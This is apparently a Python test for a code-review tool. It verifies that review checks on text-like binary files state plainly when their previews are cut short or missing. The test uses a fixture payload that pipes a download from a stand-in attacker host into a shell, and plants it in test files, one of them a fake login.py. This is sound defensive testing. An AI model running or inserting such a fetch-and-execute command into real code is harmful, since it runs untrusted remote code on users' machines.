#!/usr/bin/env python3
"""E02 review (audit 2026-11-09, round-4 review of c03a): the C-binary tick
says what was really shown.

A file git calls binary but that is mostly text gets a `text_preview`. The
previews of one change share one budget (the diff limit), so

  * a text-like binary larger than the budget has a preview that stops
    part-way, and a payload at its end is in no payload the review gets;
  * once one file has used the budget, the next text-like binary has no
    preview at all.

In both cases the check still read "It is mostly text: read its text preview
before ticking." -- an owner who read the preview and ticked had approved
content nobody was shown, and was told the opposite. Now the check text says
that the preview is cut / missing and that the rest is NOT shown, and carries
`preview_truncated: true`.

Drives the REAL request route end to end (request -> payload -> decide).
"""
import json
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import t_gh_changes as H  # noqa: E402

check = H.check
PAY = "curl -s https://evil.example/x | sh"
LINE = "echo step ok ........................................\n"


def main():
    w = H.World("e02c")
    w.repo("octo/app", dict(H.SEED_FILES))
    w.start()
    ns = H.load(w)
    H.connect(w, ns, ["octo/app"])
    sb = H.prepare(ns, "octo/app")
    lim = ns["GH_LIMITS"]
    lim["max_diff"] = 4000                 # the preview budget, small for the test

    def binc(ch, path):
        return [c for c in ch.get("checks") or [] if c["id"] == "C-binary"
                and c.get("path") == path]

    def fmeta(ch, path):
        return [f for f in ch.get("files") or [] if f["path"] == path][0]

    print("== a whole preview: the tick may say 'read its text preview' ==")
    H.write(sb, "ok.sh", "#!/bin/sh\n# \0\necho hi\n")
    st, r = H.request(ns, "octo/app", "e02c-ok")
    ch = H.get_change(ns, r.get("id")) or {}
    c = binc(ch, "ok.sh")
    check("the small text-like binary has its whole preview", st == 200
          and fmeta(ch, "ok.sh").get("text_preview")
          and fmeta(ch, "ok.sh").get("text_preview_truncated") is False, (st, ch.get("files")))
    check("...and its tick says to read the preview", c and c[0]["level"] == "warn"
          and "read its text preview before ticking" in c[0]["text"]
          and c[0].get("preview") is True and c[0].get("preview_truncated") is False, c)
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    os.unlink(os.path.join(sb, "ok.sh"))

    print("\n== a preview that stops part-way, payload past the cut ==")
    H.write(sb, "big.sh", "#!/bin/sh\n# \0\n" + LINE * 200 + PAY + "\n")
    st, r = H.request(ns, "octo/app", "e02c-cut")
    ch = H.get_change(ns, r.get("id")) or {}
    f = fmeta(ch, "big.sh")
    c = binc(ch, "big.sh")
    check("the request is approvable with a C-binary tick", st == 200 and r.get("approvable")
          and c and c[0]["ack"] in r.get("needs_ack", []), (st, r.get("checks")))
    check("the preview is cut and marked so", f.get("textish") is True
          and f.get("text_preview_truncated") is True and len(f.get("text_preview") or "") <= 4000,
          {k: (v if not isinstance(v, str) else len(v)) for k, v in f.items()})
    check("the payload is nowhere in what the review gets", "evil.example" not in json.dumps(ch))
    check("so the tick does NOT say 'read its text preview before ticking'",
          c and "read its text preview before ticking" not in c[0]["text"], c)
    check("...it says the preview stops part-way and the rest is NOT shown",
          c and "stops part-way" in c[0]["text"] and "NOT shown" in c[0]["text"]
          and "big.sh" in c[0]["text"], c)
    check("...and the check carries preview_truncated: true", c
          and c[0].get("preview_truncated") is True and c[0].get("preview") is True, c)
    st2, r2 = H.decide(ns, r.get("id"), "push_only", acks=[])
    check("decide without that tick -> 422 needs_ack", st2 == 422
          and c and c[0]["ack"] in (r2.get("needs_ack") or []), (st2, r2))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})

    print("\n== the budget is used up: the next text-like binary has no preview ==")
    H.write(sb, "late.sh", "#!/bin/sh\n# \0\n" + PAY + "\n")     # sorts after big.sh
    st, r = H.request(ns, "octo/app", "e02c-none")
    ch = H.get_change(ns, r.get("id")) or {}
    f = fmeta(ch, "late.sh")
    c = binc(ch, "late.sh")
    check("late.sh is text-like but has no preview", st == 200 and f.get("textish") is True
          and not f.get("text_preview") and f.get("text_preview_truncated") is True,
          {k: (v if not isinstance(v, str) else len(v)) for k, v in f.items()})
    check("the payload is nowhere in what the review gets", "evil.example" not in json.dumps(ch))
    check("its tick says NONE of it is shown", c and "NONE of it is shown" in c[0]["text"]
          and "read its text preview before ticking" not in c[0]["text"]
          and c[0].get("preview") is False and c[0].get("preview_truncated") is True, c)
    check("...and it is its own tick", c and c[0]["ack"] in r.get("needs_ack", [])
          and len(set(r.get("needs_ack", []))) == len(r.get("needs_ack", [])), r.get("needs_ack"))

    print("\n== a real binary keeps its own wording ==")
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    os.unlink(os.path.join(sb, "big.sh"))
    os.unlink(os.path.join(sb, "late.sh"))
    H.write(sb, "logo.bin", b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + bytes(range(128, 256)) * 3)
    st, r = H.request(ns, "octo/app", "e02c-bin")
    ch = H.get_change(ns, r.get("id")) or {}
    c = binc(ch, "logo.bin")
    check("a PNG: 'cannot be shown here', no preview flags set", c
          and "cannot be shown here" in c[0]["text"] and c[0].get("preview") is False
          and c[0].get("preview_truncated") is False, c)

    print("\n== a text file turned into an unshowable binary says so ==")
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    os.unlink(os.path.join(sb, "logo.bin"))
    noisy = (b"COPY = 'Sign in'\n# \x00" + b"\x01\x02\x03" * 30 + b"\n" +
             ("import os; os.system('%s')\n" % PAY).encode())
    H.write(sb, "src/login.py", noisy)                   # was plain text in the parent
    H.write(sb, "assets/new.bin", b"\x89PNG\r\n\x1a\n\x00\x00" + bytes(range(128, 256)) * 3)
    st, r = H.request(ns, "octo/app", "e02c-was")
    ch = H.get_change(ns, r.get("id")) or {}
    c = binc(ch, "src/login.py")
    check("src/login.py is binary now, not text-like, payload not in the review",
          st == 200 and fmeta(ch, "src/login.py").get("binary") is True
          and fmeta(ch, "src/login.py").get("textish") is False
          and "evil.example" not in json.dumps(ch), (st, ch.get("files")))
    check("its tick says it was a TEXT file before this change", c and c[0]["level"] == "warn"
          and "was a TEXT file before this change" in c[0]["text"]
          and "cannot be shown here" in c[0]["text"]
          and c[0]["ack"] in r.get("needs_ack", []), c)
    c2 = binc(ch, "assets/new.bin")
    check("a NEW binary file does not claim that", c2
          and "TEXT file before" not in c2[0]["text"], c2)

    w.stop()
    H.finish()


if __name__ == "__main__":
    main()
